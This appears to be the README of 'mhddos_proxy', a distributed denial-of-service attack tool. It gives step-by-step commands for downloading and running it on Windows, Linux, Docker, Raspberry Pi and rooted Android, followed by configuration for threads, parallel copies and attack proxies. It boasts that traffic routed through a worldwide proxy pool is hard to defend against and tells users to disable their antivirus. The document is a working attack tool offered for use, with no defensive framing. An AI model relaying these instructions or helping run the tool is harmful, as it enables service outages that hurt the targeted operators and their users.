### ‚≠ê Advantages

- Own proxy database creates the attack from the whole world, which makes it much more difficult to protect against
- Efficient on a large number of targets simultaneously
- A variety of different methods, both "classic" and proprietary ones
- Frequent automatic updates without user intervention

### üíΩ Install and run 

Attention! Updates happen automatically, all steps except the last one need to be done only at the first time!

### Windows

Our software does not contain viruses, but some antiviruses identify such software as potentially dangerous and block the files.
You may need to allow running the downloaded file, or disable your antivirus.

1. [Download the latest version](https://github.com/porthole-ascend-cinnamon/mhddos_proxy_releases/releases/latest/download/mhddos_proxy_win.exe)
   and save to a convenient location
2. To start the attack, simply launch the file by double-click

### Linux
1\. Download the appropriate version for your platform
##### x64 (amd64)
```
curl https://github.com/porthole-ascend-cinnamon/mhddos_proxy_releases/releases/latest/download/mhddos_proxy_linux -Lo mhddos_proxy_linux 
```
##### arm64 (aarch64)
```
curl https://github.com/porthole-ascend-cinnamon/mhddos_proxy_releases/releases/latest/download/mhddos_proxy_linux_arm64 -Lo mhddos_proxy_linux 
```

2\. Next, run `chmod +x mhddos_proxy_linux`
3\. To start the attack, run `./mhddos_proxy_linux` directly or inside `screen`


### Docker (any platform)

1. Install and launch [Docker](https://docs.docker.com/desktop/#download-and-install)
2. Run with the command `docker run -it --rm --pull always --net=host ghcr.io/porthole-ascend-cinnamon/mhddos_proxy`

### Raspberry Pi
Aarch64 version should work on RPi4, probably on RPi3 too. The main thing is to have 64x OS.  
Please refer to these Issues for extra info and potential solutions:

https://github.com/porthole-ascend-cinnamon/mhddos_proxy_releases/issues/19
https://github.com/porthole-ascend-cinnamon/mhddos_proxy_releases/issues/23

### Android

#### Setup

Requies [Termux](https://github.com/termux/termux-app/releases) and **root-ed decice**
```
apt update -y && apt install -y root-repo tsu glibc-repo glibc
curl https://github.com/porthole-ascend-cinnamon/mhddos_proxy_releases/releases/latest/download/mhddos_proxy_linux_arm64 -Lo mhddos_proxy
chmod +x mhddos_proxy
grun -c mhddos_proxy
```
#### Run
##### arm64 (aarch64)
```
sudo grun -n ./mhddos_proxy
```
##### arm32 (armv7)
```
apt install -y qemu-user-aarch64
sudo grun -n qemu-aarch64 ./mhddos_proxy
```

### üõ† Configuration and options

An **mhddos.ini** file will be created in the current directory on the first launch  
You may edit it to change configuration

    # Change language (ua | en | es | de | pl | lt)
    lang = ua

    # Run multiple copies (set "auto" for max value, requires 3+ core CPU and stable network)
    copies = 1

    # Number of threads per copy (to enable, remove the hashtag symbol on the next line)
    #threads = 8000

    # Use my IP/VPN for the attack in % from 0 to 100 (requires VPN or remote server)
    use-my-ip = 0

You can also specify options via command line in `--lang en`  format

Full list of options is available by `--help` command

### ‚ú™ Custom proxies
<details>
<summary>Expand</summary>

To specify custom proxy(ies), use the `proxy` option

    proxy = [socks4://114.231.123.38:3065, socks5://114.231.123.38:1080]

If the list of proxies is too big, use the local or remote file option `proxies`. 
Each proxy should be on a new line

    proxies = proxies.txt | https://pastebin.com/raw/UkFWzLOt

Surely, these options are also available via command line

    --proxy socks4://114.231.123.38:3065, socks5://114.231.123.38:1080
    --proxies proxies.txt | https://pastebin.com/raw/UkFWzLOt

#### Supported formats:

    114.231.123.38:3065
    114.231.123.38:3065:username:password
    username:password@114.231.123.38:3065
    socks4://114.231.123.38:3065
    socks5://114.231.123.38:3065:username:password
    http://username:password@114.231.123.38:3065

if protocol (`socks4`|`socks5`) is not specified, `http` is used by default
